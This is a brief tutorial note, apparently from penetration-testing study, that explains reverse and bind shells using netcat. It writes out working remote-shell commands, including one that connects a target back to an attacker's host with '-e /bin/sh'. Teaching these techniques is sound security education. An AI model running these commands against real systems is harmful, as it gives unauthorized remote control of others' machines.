Shell is basically an access to a machine. 

A reverse shell means that the victim connects to us. Basically a target is connecting and the attackbox(us) is listening. This is done with a tool called netcat(nc). So netcat basically listens on a specific port. So on the attackbox, you would be running this command:

```
nc -lvp 4444
```

-l means listening, -v means verbosely, -p means port. Here we are having 4444 as an arbitrary port connected through TCP.

Meanwhile, our target would be running this command:

```
nc <attackbox_ip> 4444 -e /bin/sh
```

-e means execute and /bin/sh is just a fancy way of saying shell. 

A bind shell on the other hand, means that the attackbox opens a port on the machine and then we connect to it. So basically, we run an exploit, which opens up a port and then we connect to the port. So in order to connect to it, the attackbox would be running this command:

```
nc <target_ip> 4444
```

and the target would be running this command:

```
nc -lvp 4444 -e /bin/sh
```

Note: We are going to be using reverse shells 95% of the time. 

But reverse shells are not the defacto solution when it comes to connecting to a machine. Sometimes you have to get over a firewall which blocks a specific port and that is where you have to use a bind shell.

